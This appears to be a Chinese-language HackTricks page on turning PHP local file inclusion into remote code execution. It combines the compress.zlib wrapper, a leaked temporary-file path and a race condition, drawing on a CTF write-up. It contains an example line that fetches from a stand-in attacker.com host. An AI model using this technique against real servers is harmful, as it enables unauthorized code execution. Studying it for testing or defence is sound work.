# LFI2RCE 通过 compress.zlib + PHP_STREAM_PREFER_STDIO + 路径泄露

{{#include ../../banners/hacktricks-training.md}}

### `compress.zlib://` 和 `PHP_STREAM_PREFER_STDIO`

使用协议 `compress.zlib://` 和标志 `PHP_STREAM_PREFER_STDIO` 打开的文件可以继续将稍后到达连接的数据写入同一文件。

这意味着像这样的调用：
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
将发送请求，询问 http://attacker.com/file，然后服务器可能会用有效的 HTTP 响应来响应请求，保持连接打开，并在稍后发送额外的数据，这些数据也将写入文件。

您可以在 php-src 代码的 main/streams/cast.c 的这一部分看到该信息：
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
### 竞争条件到 RCE

[**这个 CTF**](https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer) 是使用之前的技巧解决的。

攻击者将使 **受害者服务器打开一个连接，从攻击者的服务器读取文件**，使用 **`compress.zlib`** 协议。

**在**这个 **连接** 存在的同时，攻击者将 **提取临时文件的路径**（它被服务器泄露）。

**在**这个 **连接** 仍然打开的情况下，攻击者将 **利用 LFI 加载他控制的临时文件**。

然而，web 服务器中有一个检查 **防止加载包含 `<?`** 的文件。因此，攻击者将利用 **竞争条件**。在仍然打开的连接中，**攻击者** 将 **在** **webserver** **检查** 文件是否包含禁止字符 **之后** 发送 PHP 负载，但 **在加载其内容之前**。

有关更多信息，请查看竞争条件和 CTF 的描述 [https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer)

{{#include ../../banners/hacktricks-training.md}}
